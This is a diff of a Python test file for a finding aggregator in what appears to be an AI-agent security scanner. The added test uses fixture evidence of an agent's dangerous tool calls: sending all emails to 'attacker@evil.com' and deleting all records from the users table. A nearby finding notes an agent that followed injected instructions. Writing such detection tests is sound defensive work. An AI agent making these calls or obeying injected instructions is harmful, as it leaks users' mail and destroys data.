@@ -28,12 +28,34 @@ def test_deduplicate_very_similar():
         category=ASICategory.ASI01_GOAL_HIJACK,
         severity=Severity.HIGH,
         confidence=0.85,
-        evidence=["evidence B"],
+        evidence=["evidence A"],
         explanation="The agent followed injected instructions",
     )
     report = aggregator.aggregate("test_target", [finding1, finding2])
     assert len(report.findings) == 1
     assert report.findings[0].confidence == 0.85
+
+
+def test_keep_same_explanation_with_different_evidence():
+    aggregator = FindingAggregator()
+    finding1 = Finding(
+        attack_case_id="test_1",
+        category=ASICategory.ASI02_TOOL_MISUSE,
+        severity=Severity.MEDIUM,
+        confidence=0.5,
+        evidence=["Dangerous tool call: send_all_emails({'to': 'attacker@evil.com'})"],
+        explanation="Rule-based detection: dangerous tool call detected",
+    )
+    finding2 = Finding(
+        attack_case_id="test_2",
+        category=ASICategory.ASI02_TOOL_MISUSE,
+        severity=Severity.MEDIUM,
+        confidence=0.5,
+        evidence=["Dangerous tool call: delete_all_records({'table': 'users'})"],
+        explanation="Rule-based detection: dangerous tool call detected",
+    )
+    report = aggregator.aggregate("test_target", [finding1, finding2])
+    assert len(report.findings) == 2
 
 
 def test_keep_different_categories():
